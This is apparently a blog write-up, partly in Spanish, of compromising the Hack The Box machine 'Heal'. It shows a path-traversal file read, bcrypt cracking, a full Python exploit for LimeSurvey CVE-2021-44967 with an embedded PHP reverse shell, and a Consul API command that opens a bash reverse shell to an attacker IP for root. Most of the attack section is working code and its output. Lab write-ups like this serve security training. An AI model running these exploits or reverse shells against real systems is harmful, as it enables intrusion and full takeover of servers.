---
layout: single
title: Heal - Hack The Box
excerpt: "Heal is a medium-difficult Linux machine that features a website vulnerable to arbitrary file read, allowing us to extract sensitive credentials. The server also hosts a LimeSurvey instance, where the leaked credentials can be used to log in as an administrator. Since administrators can upload plugins, we can exploit this to upload a malicious plugin and gain a reverse shell as the 'www-data' user. Further enumeration reveals the database password for LimeSurvey, which is reused by the system user 'ron', allowing us to escalate access. The server also runs a local instance of the Consul Agent as 'root'. By registering a malicious service via the Consul API, we can escalate privileges and gain root access."
date: 2025-06-21
classes: wide
header:
  teaser: /img2/heal.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - LFI (Local File Inclusion)
  - PostgreSQL Cracking Hashes
  - LimeSurvey RCE (CVE-2021-44967)
  - Information Leakage
  - Hashicorp Consul v1.0 - Remote Command Execution (RCE) 
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.46
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:13 CEST
Nmap scan report for 10.10.11.46
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p22,80 10.10.11.46
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:14 CEST
Nmap scan report for 10.10.11.46
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.11.46 heal.htb" >> /etc/hosts
```

- Find new subdomain

![](/img2/Pasted%20image%2020250621122151.png)

> Vemos que nos lanza un error al iniciar sesión, puesto que no tenemos el subdominio api.heal.htb dentro del /etc/hosts

```bash
❯ echo "10.10.11.46 api.heal.htb" >> /etc/hosts
```

## Exploitation

- Local File Inclusion (LFI)

![](/img2/Pasted%20image%2020250621135149.png)

> Interceptamos la petición que hace el servidor a la api para descargar el archivo pdf.

![](/img2/Pasted%20image%2020250621130543.png)

> Vemos que es vulnerable a LFI, en este punto podemos ver todos los dominios que tiene el sistema dentro del /etc/hosts.

```bash
❯ echo "10.10.11.46 take-survey.heal.htb" >> /etc/hosts
```

![](/img2/Pasted%20image%2020250621141324.png)

> Para apuntar a los archivos de configuración de la web necesitamos saber que hay por detrás, en este caso se está usando Ruby.

![](/img2/Pasted%20image%2020250621141516.png)

> Fuzzeamos un poco y encontramos el archivo de configuración config.ru, donde se encuentran las rutas de config/ y de enviroment/.

![](/img2/Pasted%20image%2020250621141728.png)

> Podemos preguntar al ChatGPT la esctructura de directorios normalmente usados en Rails.

![](/img2/Pasted%20image%2020250621142039.png)

> Dentro del archivo database.yml encontramos la ruta del archivo de la base de datos sqlite3.

```bash
❯ curl -k 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' --output sql.sqlite3
```

```ruby
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 32768  100 32768    0     0   112k      0 --:--:-- --:--:-- --:--:--  112k
```

```bash
❯ sqlite3 sql.sqlite3
```

```ruby
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
```

```bash
sqlite> .tables
```

```ruby
ar_internal_metadata  token_blacklists    
schema_migrations     users       
```

```bash
sqlite> select * from users;
```

```ruby
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|test@test.com|$2a$12$CAZH4w/pMjF8K2IbmOEpq.8x7OGEUMOJr4r1ocJZryQ/tXgDvqTT.|2025-06-21 11:15:34.906487|2025-06-21 11:15:34.906487|test|test|0
```

> Podemos ver el hash de la contraseña del usuario ralph

- Crack MD5 Hash

```bash
❯ echo "\$2a\$12\$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG" > hash.txt
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```ruby
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
147258369        (?)  
```

> Encontramos la contraseña para el usuario ralph: 147258369

![](/img2/Pasted%20image%2020250621142858.png)

- LimeSurvey 5.2 and higher versions RCE (CVE-2021-44967) (Exploit)

```python
import os
import sys
import time
import argparse
import requests
import sys
import string
import random
import warnings
import zipfile
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str

def get_csrf_token(url):
    page = req.get(url)
    response = page.text
    s = BeautifulSoup(response, 'html.parser')
    
    csrf_token = s.findAll('input')[0].get("value")

    return csrf_token

# Main function
if __name__ == '__main__':

    p = argparse.ArgumentParser(description="LimeSurvey - RCE")
    p.add_argument('--url', help="URL of the LimeSurvey web root", required=True)
    p.add_argument('--user', help="username to log in", required=True)
    p.add_argument('--password', help="password of the username", required=True)
    p.add_argument('--lhost', help="local host to receive the reverse shell", required=True)
    p.add_argument('--lport', help="local port to receive the reverse shell", required=True)
    p.add_argument('--verbose', help="enable verbose", action='store_true', default=False, required=False)

    # Parse CLI arguments
    parser = p.parse_args()

    url = parser.url
    username = parser.user
    password = parser.password
    lhost = parser.lhost
    lport = parser.lport
    verbose = parser.verbose

    url = url.rstrip("/")

    req = requests.session()

    print("[+] LimeSurvey - RCE\n")
    time.sleep(0.5)

    print("[+] URL: " + url + "\n")
    
    print("[*] Creating malicious zip file...")
    time.sleep(0.5)

    random_name = get_random_string(10)
    print("  > Plugin name: " + random_name)

    if verbose:
        print("  > Creating php reverse shell file...")
    php_content = """<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + lhost + """';
$port = """ + lport + """;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>"""

    if verbose:
        print("  > Creating plugin XML config file...")

    config_content = """<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>""" + random_name + """</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>D3Ext</author>
        <authorUrl>https://github.com/D3Ext</authorUrl>
        <supportUrl>https://github.com/D3Ext</supportUrl>
        <version>5.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
		<![CDATA[Author : D3Ext]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
    """

    # create php file
    php_f = open("php-rev.php", "w")
    # write content
    php_f.write(php_content)
    php_f.close()

    # create config file
    config_f = open("config.xml", "w")
    # write content
    config_f.write(config_content)
    config_f.close()

    # create zip file
    with zipfile.ZipFile(random_name + ".zip", 'w') as zipf:
        zipf.write(os.path.abspath("config.xml"), arcname=os.path.basename("config.xml"))
        zipf.write(os.path.abspath("php-rev.php"), arcname=os.path.basename("php-rev.php"))

    # open zip file
    filehandle = open(random_name + ".zip", mode="rb")

    time.sleep(0.5)

    # remove files
    try:
        os.remove("php-rev.php")
        os.remove("config.xml")
    except Exception as e:
        print(e)

    print("\n[*] Sending login request...")
    time.sleep(0.5)

    if verbose:
        print("  > Capturing CSRF token...")

    csrf_token = get_csrf_token(url + "/index.php/admin/authentication/sa/login")
    
    if verbose:
        print("  > CSRF token: " + csrf_token)

    login_creds = {
        "user": username,
        "password": password,
        "authMethod": "Authdb",
        "loginlang": "default",
        "action": "login",
        "width": "1581",
        "login_submit": "login",
        "YII_CSRF_TOKEN": csrf_token
    }
    
    login = req.post(url + "/index.php/admin/authentication/sa/login", data=login_creds)

    print("[+] Successfully logged in as " + username + "\n")
    time.sleep(0.5)

    print("[*] Uploading malicious plugin...")
    time.sleep(0.5)

    if verbose:
        print("  > Retrieving CSRF token...")

    csrf_token2 = get_csrf_token(url + "/index.php/admin/pluginmanager/sa/index")

    if verbose:
        print("  > CSRF token: " + csrf_token2)

    upload_creds = {
        "YII_CSRF_TOKEN": csrf_token2,
        "lid": "$lid",
        "action": "templateupload"
    }

    file_upload = req.post(url + "/index.php/admin/pluginmanager?sa=upload", files = {'the_file': filehandle}, data=upload_creds)
    upload_page = req.get(url + "/index.php/admin/pluginmanager?sa=uploadConfirm")
    response = upload_page.text

    print("[+] The malicious plugin was successfully uploaded\n")
    time.sleep(0.5)

    print("[*] Installing uploaded plugin...")
    time.sleep(0.5)

    if verbose:
        print("  > Retrieving CSRF token...")

    csrf_token3 = get_csrf_token(url + "/index.php/admin/pluginmanager?sa=installUploadedPlugin")
    
    if verbose:
        print("  > CSRF token: " + csrf_token3)

    install_creds = {
        "YII_CSRF_TOKEN": csrf_token3,
        "isUpdate": "false"
    }

    file_install = req.post(url + "/index.php/admin/pluginmanager?sa=installUploadedPlugin", data=install_creds)

    print("[+] The plugin was successfully installed\n")
    time.sleep(0.5)

    print("[*] Activating malicious plugin...")
    time.sleep(0.5)

    if verbose:
        print("  > Retrieving CSRF token...")

    csrf_token4 = get_csrf_token(url + "/index.php/admin/pluginmanager?sa=activate")

    if verbose:
        print("  > CSRF token: " + csrf_token4)

    activate_data = {
        "YII_CSRF_TOKEN": csrf_token4,
        "pluginId": "1"
    }

    file_activate = req.post(url + "/index.php/admin/pluginmanager?sa=activate", data=activate_data)

    print("[+] Malicious plugin was successfully activated")
    time.sleep(0.5)

    print("\n[*] Triggering plugin by sending request to " + url + "/upload/plugins/" + random_name + "/php-rev.php")
    time.sleep(0.5)
    print("[+] Check your netcat listener!\n")

    # remove zip file
    os.remove(random_name + ".zip")

    # trigger php reverse shell
    rev = req.get(url + "/upload/plugins/" + random_name + "/php-rev.php")
```

```bash
❯ python3 exploit.py --url http://take-survey.heal.htb --user ralph --password 147258369 --lhost 10.10.16.7 --lport 9000
```

```ruby
[+] LimeSurvey - RCE

[+] URL: http://take-survey.heal.htb

[*] Creating malicious zip file...
  > Plugin name: ozlnatsbdt

[*] Sending login request...
/home/pyuser/exploit.py:41: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  csrf_token = s.findAll('input')[0].get("value")
[+] Successfully logged in as ralph

[*] Uploading malicious plugin...
[+] The malicious plugin was successfully uploaded

[*] Installing uploaded plugin...
[+] The plugin was successfully installed

[*] Activating malicious plugin...
[+] Malicious plugin was successfully activated

[*] Triggering plugin by sending request to http://take-survey.heal.htb/upload/plugins/ozlnatsbdt/php-rev.php
[+] Check your netcat listener!
```

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.46] 48978
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 12:32:35 up  1:34,  0 users,  load average: 0.06, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

- Manual explotation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Exploit</name>
        <type>plugin</type>
        <creationDate>2025-06-21</creationDate>
        <lastUpdate>2025-06-21</lastUpdate>
        <author>PyUs3r</author>
        <authorUrl>https://test.com</authorUrl>
        <supportUrl>https://test.com</supportUrl>
        <version>69.0</version>
        <license>GNU GPL v2+</license>
        <description>Testing</description>
    </metadata>
    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

```php
<?php
  system("id");
?>
```

```bash
❯ zip exploit.zip cmd.php config.xml
```

```ruby
  adding: cmd.php (stored 0%)
  adding: config.xml (deflated 58%)                               
```

> Primero creamos el comprimido con los archivos: 
> 1. XML con la información del plugin 
> 2. PHP con el código malicioso.

![](/img2/Pasted%20image%2020250621162302.png)

![](/img2/Pasted%20image%2020250621162335.png)

![](/img2/Pasted%20image%2020250621162419.png)

![](/img2/Pasted%20image%2020250621162632.png)

> Creamos el plugin, lo activamos y apuntamos hacia el mediante la ruta /upload/plugins/{Extensión}/{Archivo php}

## Post-exploitation

- Find database password

```bash
www-data@heal:~/limesurvey/application/config$ cat config.php | grep pass
```

```ruby
|    'password' The password used to connect to the database
			'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
			'password' => 'AdmiDi0_pA$$w0rd',
```

> En el archivo de configuración del directorio /limesurvey encontramos la contraseña de la base de datos PostgreSQL:

- Pivoting

```bash
www-data@heal:~/limesurvey/application/config$ su ron 
```

```ruby
Password: 
ron@heal:/var/www/limesurvey/application/config$ 
```

- Check internal ports

```bash
ron@heal:~$ ss -nltp
```

```ruby
State                   Recv-Q                  Send-Q                                   Local Address:Port                                     Peer Address:Port                  Process                  
LISTEN                  0                       244                                          127.0.0.1:5432                                          0.0.0.0:*                                              
LISTEN                  0                       511                                          127.0.0.1:3000                                          0.0.0.0:*                                              
LISTEN                  0                       1024                                         127.0.0.1:3001                                          0.0.0.0:*                                              
LISTEN                  0                       4096                                     127.0.0.53%lo:53                                            0.0.0.0:*                                              
LISTEN                  0                       128                                            0.0.0.0:22                                            0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:8600                                          0.0.0.0:*                                              
LISTEN                  0                       511                                            0.0.0.0:80                                            0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:8500                                          0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:8503                                          0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:8300                                          0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:8301                                          0.0.0.0:*                                              
LISTEN                  0                       4096                                         127.0.0.1:8302                                          0.0.0.0:*                                              
LISTEN                  0                       128                                               [::]:22                                               [::]:*     
```

> Vemos varios puertos abiertos, nos pasamos todos a nuestro equipo con chisel y los inspeccionamos uno a uno.

![](/img2/Pasted%20image%2020250621171612.png)

> Vemos un puerto con la plataforma Consul.

- Hashicorp Consul v1.0 - Remote Command Execution (RCE) 

```bash
ron@heal:~$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d '{"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.7/9000 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}'
```

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.46] 41324
bash: cannot set terminal process group (53971): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# 
```


![](/img2/Pasted%20image%2020250621171501.png)